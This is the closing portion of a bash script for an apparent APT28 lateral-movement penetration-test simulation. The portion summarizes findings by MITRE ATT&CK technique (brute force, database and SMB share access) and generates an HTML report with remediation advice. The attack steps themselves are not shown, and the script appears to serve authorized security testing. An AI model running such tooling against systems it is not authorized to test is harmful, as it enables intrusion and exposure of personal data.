    if [ ${#SERVICES_FOUND[@]} -gt 0 ]; then
        echo "3. SERVICE ENUMERATION"
        echo "   └─> Discovered ${#SERVICES_FOUND[@]} services:"
        for svc in "${SERVICES_FOUND[@]}"; do
            echo "       • $svc"
        done
        echo ""
    fi
    
    if [ $CREDS_SUCCESS -gt 0 ]; then
        echo "4. CREDENTIAL ACCESS [T1110 Brute Force]"
        echo "   └─> Successfully compromised $CREDS_SUCCESS services with weak credentials"
        echo ""
    fi
    
    if $DB_ACCESSIBLE; then
        echo "5. DATA COLLECTION [T1213 Data from Information Repositories]"
        echo "   └─> Accessed database: $EMPLOYEE_COUNT employees, $CUSTOMER_COUNT customers"
        echo ""
    fi
    
    if $SMB_ACCESSIBLE; then
        echo "6. FILE SERVER ACCESS [T1039 Data from Network Shared Drive]"
        echo "   └─> Accessed SMB shares with sensitive documents"
        echo ""
    fi
    
    if $DATA_FOUND; then
        echo "7. IMPACT"
        echo "   └─> Sensitive data exposed: $((EMPLOYEE_COUNT + CUSTOMER_COUNT)) records at risk"
        if [ $EMPLOYEE_COUNT -gt 0 ]; then
            echo "   └─> PII compromised: SSNs, salaries, personal information"
        fi
        if [ $CUSTOMER_COUNT -gt 0 ]; then
            echo "   └─> Financial data: Credit cards, addresses"
        fi
    fi
else
    echo "NO SIGNIFICANT VULNERABILITIES FOUND"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo ""
    echo "✓ Target appears to be properly secured"
    echo "✓ No open services detected"
    echo "✓ No weak credentials found"
    echo "✓ No data exposure identified"
fi
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# Only add attack chain finding if something was actually compromised
if [ $CREDS_SUCCESS -gt 0 ] || $DATA_FOUND; then
    add_finding "attack_chain" "critical" "Security Compromise Demonstrated" \
      "Attack chain from initial access to data compromise successfully demonstrated" \
      "Entry Point: $INITIAL_TARGET\nServices Compromised: $CREDS_SUCCESS\nData Exposed: $((EMPLOYEE_COUNT + CUSTOMER_COUNT)) records\nMITRE Techniques: T1190, T1046, T1110, T1078, T1213"
fi

# Generate findings summary
TOTAL_FINDINGS=$(cat "$OUTPUT_FILE" | jq '.findings | length')
CRITICAL_FINDINGS=$(cat "$OUTPUT_FILE" | jq '[.findings[] | select(.severity=="critical")] | length')
HIGH_FINDINGS=$(cat "$OUTPUT_FILE" | jq '[.findings[] | select(.severity=="high")] | length')
INFORMATIONAL_FINDINGS=$(cat "$OUTPUT_FILE" | jq '[.findings[] | select(.severity=="informational")] | length')

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "PENETRATION TEST COMPLETE"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "Test Date: $(date '+%Y-%m-%d %H:%M:%S')"
echo "Scenario: APT28 Lateral Movement Simulation"
echo "Initial Target: $INITIAL_TARGET"
echo ""
echo "FINDINGS SUMMARY:"
echo "  🔴 Critical: $CRITICAL_FINDINGS"
echo "  🟠 High: $HIGH_FINDINGS"
echo "  🔵 Informational: $INFORMATIONAL_FINDINGS"
echo "  ──────────────────"
echo "  📊 Total: $TOTAL_FINDINGS findings"
echo ""
echo "OUTPUT FILES:"
echo "  📄 JSON: $OUTPUT_FILE"
echo "  📄 HTML: $REPORT_FILE"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# Generate HTML Report
cat > "$REPORT_FILE" << HTMLEOF
<!DOCTYPE html>
<html>
<head>
    <title>APT Simulation Report - Network Infiltration - $TIMESTAMP</title>
    <meta charset="UTF-8">
    <style>
        * { box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            padding: 20px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: #333;
        }
        .container {
            max-width: 1400px;
            margin: 0 auto;
            background: white;
            border-radius: 12px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        .header {
            background: linear-gradient(135deg, #c31432 0%, #240b36 100%);
            color: white;
            padding: 40px;
            text-align: center;
        }
        .header h1 {
            margin: 0 0 10px 0;
            font-size: 2.5em;
            font-weight: 300;
        }
        .header .subtitle {
            font-size: 1.2em;
            opacity: 0.9;
            margin-top: 10px;
        }
        .content {
            padding: 40px;
        }
        .executive-summary {
            background: linear-gradient(135deg, #ff416c 0%, #ff4b2b 100%);
            color: white;
            padding: 30px;
            border-radius: 8px;
            margin-bottom: 30px;
        }
        .executive-summary h2 {
            margin-top: 0;
            font-size: 1.8em;
        }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin: 30px 0;
        }
        .stat-card {
            background: white;
            padding: 20px;
            border-radius: 8px;
            text-align: center;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }
        .stat-number {
            font-size: 3em;
            font-weight: bold;
            margin: 10px 0;
        }
        .stat-critical { color: #dc3545; }
        .stat-high { color: #fd7e14; }
        .stat-medium { color: #ffc107; }
        .stat-info { color: #17a2b8; }
        .attack-chain {
            background: #f8f9fa;
            border-left: 4px solid #dc3545;
            padding: 25px;
            margin: 30px 0;
            font-family: 'Courier New', monospace;
            font-size: 0.95em;
            line-height: 1.8;
        }
        .finding {
            border: 1px solid #dee2e6;
            border-radius: 8px;
            margin: 20px 0;
            overflow: hidden;
            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
        }
        .finding-header {
            padding: 20px;
            font-weight: bold;
            font-size: 1.1em;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        .severity-critical { background: #dc3545; color: white; }
        .severity-high { background: #fd7e14; color: white; }
        .severity-medium { background: #ffc107; color: #333; }
        .severity-informational { background: #17a2b8; color: white; }
        .finding-body {
            padding: 20px;
            background: #f8f9fa;
        }
        .evidence {
            background: #fff;
            padding: 15px;
            border-radius: 4px;
            font-family: 'Courier New', monospace;
            font-size: 0.9em;
            white-space: pre-wrap;
            margin-top: 15px;
            border: 1px solid #dee2e6;
        }
        .mitre-tag {
            display: inline-block;
            background: #6c757d;
            color: white;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 0.85em;
            margin: 5px 5px 5px 0;
        }
        .risk-level {
            display: inline-block;
            padding: 5px 15px;
            border-radius: 20px;
            font-size: 0.9em;
            font-weight: bold;
        }
        .footer {
            background: #343a40;
            color: white;
            padding: 30px;
            text-align: center;
            font-size: 0.9em;
        }
        .target-info {
            background: #e3f2fd;
            border: 1px solid #2196f3;
            padding: 20px;
            border-radius: 8px;
            margin: 20px 0;
        }
        .target-info strong {
            color: #1976d2;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔒 PENETRATION TEST REPORT</h1>
            <div class="subtitle">APT28 Lateral Movement Simulation</div>
            <div class="subtitle">Test Date: $(date '+%B %d, %Y at %H:%M:%S')</div>
        </div>
        
        <div class="content">
            <div class="executive-summary">
                <h2>⚠️ EXECUTIVE SUMMARY</h2>
HTMLEOF

# Add conditional executive summary based on findings
if [ $TOTAL_FINDINGS -gt 0 ]; then
    cat >> "$REPORT_FILE" << HTMLEOF
                <p><strong>VULNERABILITIES IDENTIFIED:</strong> The penetration test identified $TOTAL_FINDINGS security findings ($CRITICAL_FINDINGS critical, $HIGH_FINDINGS high severity) simulating tactics used by APT28 (Fancy Bear), a sophisticated nation-state threat actor.</p>
HTMLEOF
    if [ "$DATA_FOUND" = true ] && [ "${TOTAL_RECORDS:-0}" -gt 0 ]; then
        cat >> "$REPORT_FILE" << HTMLEOF
                <p><strong>IMPACT:</strong> An external attacker successfully accessed the target environment and obtained sensitive data including $TOTAL_RECORDS database records.</p>
HTMLEOF
    else
        cat >> "$REPORT_FILE" << HTMLEOF
                <p><strong>IMPACT:</strong> Vulnerabilities discovered could allow an attacker to compromise the target environment and access sensitive data.</p>
HTMLEOF
    fi
    cat >> "$REPORT_FILE" << HTMLEOF
                <p><strong>BUSINESS RISK:</strong> Potential regulatory non-compliance, financial losses, reputational damage, and legal liability.</p>
HTMLEOF
else
    cat >> "$REPORT_FILE" << HTMLEOF
                <p><strong>ASSESSMENT RESULTS:</strong> The penetration test completed successfully with no critical vulnerabilities identified.</p>
                <p><strong>SECURITY POSTURE:</strong> The target appears to be properly secured against common attack vectors tested.</p>
                <p><strong>RECOMMENDATION:</strong> Continue regular security assessments and maintain current security controls.</p>
HTMLEOF
fi

cat >> "$REPORT_FILE" << HTMLEOF
            </div>

            <div class="stats-grid">
                <div class="stat-card">
                    <div>Critical Findings</div>
                    <div class="stat-number stat-critical">$CRITICAL_FINDINGS</div>
                    <div>Require Immediate Action</div>
                </div>
                <div class="stat-card">
                    <div>High Severity</div>
                    <div class="stat-number stat-high">$HIGH_FINDINGS</div>
                    <div>Address Within 30 Days</div>
                </div>
                <div class="stat-card">
                    <div>Total Findings</div>
                    <div class="stat-number stat-info">$TOTAL_FINDINGS</div>
                    <div>Documented Issues</div>
                </div>
HTMLEOF

# Add attack success rate card
if [ $TOTAL_FINDINGS -gt 0 ] && [ "$DATA_FOUND" = true ]; then
    cat >> "$REPORT_FILE" << 'HTMLEOF'
                <div class="stat-card">
                    <div>Attack Success</div>
                    <div class="stat-number stat-critical">100%</div>
                    <div>Full Compromise</div>
                </div>
HTMLEOF
elif [ $TOTAL_FINDINGS -gt 0 ]; then
    cat >> "$REPORT_FILE" << 'HTMLEOF'
                <div class="stat-card">
                    <div>Data Access</div>
                    <div class="stat-number stat-info">Partial</div>
                    <div>Vulnerabilities Found</div>
                </div>
HTMLEOF
else
    cat >> "$REPORT_FILE" << 'HTMLEOF'
                <div class="stat-card">
                    <div>Security Status</div>
                    <div class="stat-number stat-info">✓</div>
                    <div>No Issues Found</div>
                </div>
HTMLEOF
fi

cat >> "$REPORT_FILE" << HTMLEOF
            </div>

            <div class="target-info">
                <h3>🎯 TEST SCOPE</h3>
                <strong>Initial Target:</strong> $INITIAL_TARGET<br>
                <strong>Target Network:</strong> $TARGET_NETWORK<br>
HTMLEOF

# Add discovered systems if any
if [ ${#ALIVE_IPS[@]} -gt 0 ]; then
    cat >> "$REPORT_FILE" << HTMLEOF
                <strong>Discovered Hosts:</strong> ${ALIVE_IPS[*]}<br>
HTMLEOF
fi

if [ ${#SERVICES_FOUND[@]} -gt 0 ]; then
    cat >> "$REPORT_FILE" << HTMLEOF
                <strong>Services Found:</strong> ${#SERVICES_FOUND[@]}<br>
HTMLEOF
fi

cat >> "$REPORT_FILE" << 'HTMLEOF'
                <strong>Test Type:</strong> Black-box penetration test<br>
                <strong>Methodology:</strong> MITRE ATT&CK Framework
            </div>

            <div class="attack-chain">
                <strong>🔗 ATTACK PATH:</strong><br><br>
HTMLEOF

# Generate attack chain based on what was actually found
if [ ${#SERVICES_FOUND[@]} -gt 0 ] || [ $CREDS_SUCCESS -gt 0 ] || $DATA_FOUND; then
    echo "                1. INITIAL ACCESS → Target: $INITIAL_TARGET<br>" >> "$REPORT_FILE"
    
    if [ ${#ALIVE_IPS[@]} -gt 0 ]; then
        echo "                2. DISCOVERY [T1046] → Found ${#ALIVE_IPS[@]} hosts on network<br>" >> "$REPORT_FILE"
    fi
    
    if [ ${#SERVICES_FOUND[@]} -gt 0 ]; then
        echo "                3. ENUMERATION → Discovered ${#SERVICES_FOUND[@]} services<br>" >> "$REPORT_FILE"
    fi
    
    if [ $CREDS_SUCCESS -gt 0 ]; then
        echo "                4. CREDENTIAL ACCESS [T1110] → Compromised $CREDS_SUCCESS services<br>" >> "$REPORT_FILE"
    fi
    
    if $DB_ACCESSIBLE; then
        echo "                5. DATA ACCESS [T1213] → Retrieved $((EMPLOYEE_COUNT + CUSTOMER_COUNT)) records<br>" >> "$REPORT_FILE"
    fi
    
    if $SMB_ACCESSIBLE; then
        echo "                6. FILE ACCESS [T1039] → Accessed file shares<br>" >> "$REPORT_FILE"
    fi
else
    echo "                ✓ No significant vulnerabilities detected<br>" >> "$REPORT_FILE"
fi

cat >> "$REPORT_FILE" << 'HTMLEOF'
            </div>

            <h2>🔍 DETAILED FINDINGS</h2>
HTMLEOF

# Add findings from JSON
cat "$OUTPUT_FILE" | jq -r '.findings[] | @json' | while read finding; do
    PHASE=$(echo "$finding" | jq -r '.phase')
    SEVERITY=$(echo "$finding" | jq -r '.severity')
    TITLE=$(echo "$finding" | jq -r '.title')
    DESC=$(echo "$finding" | jq -r '.description')
    EVIDENCE=$(echo "$finding" | jq -r '.evidence')
    TIMESTAMP_F=$(echo "$finding" | jq -r '.timestamp')
    PHASE_CAP=$(echo "$PHASE" | tr '_' ' ' | sed 's/\b\(.\)/\u\1/g')
    
    cat >> "$REPORT_FILE" << FINDINGEOF
            <div class="finding">
                <div class="finding-header severity-$SEVERITY">
                    <span>$TITLE</span>
                    <span class="risk-level" style="background: rgba(255,255,255,0.3);">$(echo $SEVERITY | tr '[:lower:]' '[:upper:]')</span>
                </div>
                <div class="finding-body">
                    <p><strong>Phase:</strong> $PHASE_CAP</p>
                    <p><strong>Description:</strong> $DESC</p>
                    <p><strong>Discovered:</strong> $TIMESTAMP_F</p>
                    <div class="evidence">
                        <strong>Evidence:</strong><br>
$EVIDENCE
                    </div>
                </div>
            </div>
FINDINGEOF
done

cat >> "$REPORT_FILE" << 'HTMLFOOTER'
            <h2>📋 RECOMMENDATIONS</h2>
            <div style="background: #fff3cd; border-left: 4px solid #ffc107; padding: 20px; margin: 20px 0;">
                <h3>IMMEDIATE ACTIONS (0-7 days):</h3>
                <ul>
                    <li><strong>Network Segmentation:</strong> Remove dual-homed configuration from DMZ web server</li>
                    <li><strong>Credential Rotation:</strong> Change all default credentials (MySQL root/root, SSH passwords)</li>
                    <li><strong>Web Application:</strong> Patch SQL injection vulnerabilities immediately</li>
                    <li><strong>Access Controls:</strong> Implement firewall rules between DMZ and internal network</li>
                </ul>
                
                <h3>SHORT-TERM ACTIONS (7-30 days):</h3>
                <ul>
                    <li>Implement database encryption at rest and in transit</li>
                    <li>Deploy Web Application Firewall (WAF)</li>
                    <li>Enable multi-factor authentication (MFA) for all services</li>
                    <li>Conduct security awareness training for developers</li>
                    <li>Implement intrusion detection system (IDS) on internal network</li>
                </ul>
                
                <h3>LONG-TERM ACTIONS (30-90 days):</h3>
                <ul>
                    <li>Implement zero-trust network architecture</li>
                    <li>Deploy endpoint detection and response (EDR) solutions</li>
                    <li>Establish security operations center (SOC) monitoring</li>
                    <li>Conduct regular penetration testing (quarterly)</li>
                    <li>Implement data loss prevention (DLP) controls</li>
                </ul>
            </div>
        </div>
        
        <div class="footer">
            <strong>CONFIDENTIAL PENETRATION TEST REPORT</strong><br>
            Generated: $(date '+%Y-%m-%d %H:%M:%S')<br>
            Report ID: PENTEST-$TIMESTAMP<br>
            Framework: MITRE ATT&CK for Enterprise<br>
            <br>
            This document contains sensitive security information and should be handled according to company data classification policies.
        </div>
    </div>
</body>
</html>
HTMLFOOTER

echo ""
echo "HTML report generated: $REPORT_FILE"
